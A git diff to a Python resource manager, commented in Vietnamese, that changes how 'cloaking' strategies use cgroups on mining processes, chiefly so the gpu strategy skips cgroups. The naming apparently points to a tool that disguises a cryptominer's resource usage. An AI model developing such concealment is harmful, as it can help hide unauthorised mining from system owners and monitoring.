@@ -189,12 +189,13 @@ class SharedResourceManager:
             pid = process.pid
             name = process.name
 
-            # Kiểm tra sự tồn tại của các controller cần thiết
-            required_controllers = ['cpu', 'gpu', 'memory', 'cache', 'network', 'io']  # Bao gồm tất cả các controller
-            for controller in required_controllers:
-                if controller not in cgroups:
-                    self.logger.error(f"Controller '{controller}' không được định nghĩa trong cgroups cấu hình: {cgroups}")
-                    return
+            # Nếu không phải là chiến lược 'gpu', kiểm tra sự tồn tại của các controller cần thiết
+            if strategy_name.lower() != 'gpu':
+                required_controllers = ['cpu', 'memory', 'cache', 'network', 'io']  # Loại bỏ 'gpu'
+                for controller in required_controllers:
+                    if controller not in cgroups:
+                        self.logger.error(f"Controller '{controller}' không được định nghĩa trong cgroups cấu hình: {cgroups}")
+                        return
 
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
             strategy = CloakStrategyFactory.create_strategy(
@@ -213,7 +214,11 @@ class SharedResourceManager:
                 return
 
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
-            strategy.apply(process, cgroups)  # Các điều chỉnh tài nguyên được thực hiện trực tiếp bởi strategy
+            # Nếu là 'gpu', truyền {} cho cgroups
+            if strategy_name.lower() == 'gpu':
+                strategy.apply(process, {})
+            else:
+                strategy.apply(process, cgroups)
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
             
         except psutil.NoSuchProcess as e:
@@ -226,21 +231,15 @@ class SharedResourceManager:
             )
             raise
 
-    def restore_resources(self, process: MiningProcess):
-        """
-        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách xóa các cgroup đang giới hạn tài nguyên đó.
 
-        Args:
-            process (MiningProcess): Đối tượng tiến trình khai thác.
-        """
+    def restore_resources(self, process: MiningProcess):
         try:
             pid = process.pid
             name = process.name
             cgroups = self.config.get('cgroups', {})
-            controllers = ['cpu', 'gpu', 'memory', 'cache', 'network', 'io']
+            controllers = ['cpu', 'memory', 'cache', 'network', 'io']  # Loại bỏ 'gpu'
             restored = False
 
-            # Kiểm tra và xóa từng cgroup liên quan đến tiến trình
             for controller in controllers:
                 cgroup_name = cgroups.get(controller, f"{controller}_cloak_{pid}")
                 if self.cgroup_manager.cgroup_exists(cgroup_name):
@@ -250,12 +249,12 @@ class SharedResourceManager:
                         restored = True
                     else:
                         self.logger.error(f"Không thể xóa cgroup '{cgroup_name}' cho PID={pid}.")
-
+            
+            # Không xử lý 'gpu' cgroup
             if restored:
                 self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
             else:
                 self.logger.warning(f"Không tìm thấy cgroup nào để xóa cho {name} (PID: {pid}).")
-
         except psutil.NoSuchProcess:
             self.logger.error(f"Tiến trình PID={pid} không tồn tại khi khôi phục tài nguyên.")
         except psutil.AccessDenied:
@@ -391,7 +390,7 @@ class ResourceManager(BaseManager):
             task = {
                 'type': 'cloaking',
                 'process': process,
-                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'io']  # Tất cả các chiến lược cloaking chính
+                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']  # Tất cả các chiến lược cloaking chính
             }
             priority = 1  # Yêu cầu cloaking có ưu tiên cao nhất
             count_val = next(self._counter)
@@ -641,7 +640,7 @@ class ResourceManager(BaseManager):
             if adjustments.get('cpu_cloak'):
                 self.shared_resource_manager.apply_cloak_strategy('cpu', process, self.config.get('cgroups', {}))
             if adjustments.get('gpu_cloak'):
-                self.shared_resource_manager.apply_cloak_strategy('gpu', process, self.config.get('cgroups', {}))
+                self.shared_resource_manager.apply_cloak_strategy('gpu', process, {})
             if adjustments.get('network_cloak'):
                 self.shared_resource_manager.apply_cloak_strategy('network', process, self.config.get('cgroups', {}))
             if adjustments.get('io_cloak'):
@@ -658,9 +657,6 @@ class ResourceManager(BaseManager):
             self.logger.error(f"apply_monitoring_adjustments error: {e}\n{traceback.format_exc()}")
 
     def process_resource_adjustments(self):
-        """
-        Thread để xử lý các điều chỉnh tài nguyên từ resource_adjustment_queue.
-        """
         while not self.stop_event.is_set():
             try:
                 priority, count_val, task = self.resource_adjustment_queue.get(timeout=1)
@@ -682,8 +678,12 @@ class ResourceManager(BaseManager):
                             strategy_instance = self.shared_resource_manager.strategy_cache[strategy]
 
                         if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
-                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
-                            strategy_instance.apply(task['process'], self.config.get('cgroups', {}))
+                            if strategy == 'gpu':
+                                self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid} mà không dùng cgroup.")
+                                strategy_instance.apply(task['process'], {})  # Không truyền cgroups
+                            else:
+                                self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
+                                strategy_instance.apply(task['process'], self.config.get('cgroups', {}))
                         else:
                             self.logger.error(f"Không thể áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
                 elif task['type'] == 'restoration':
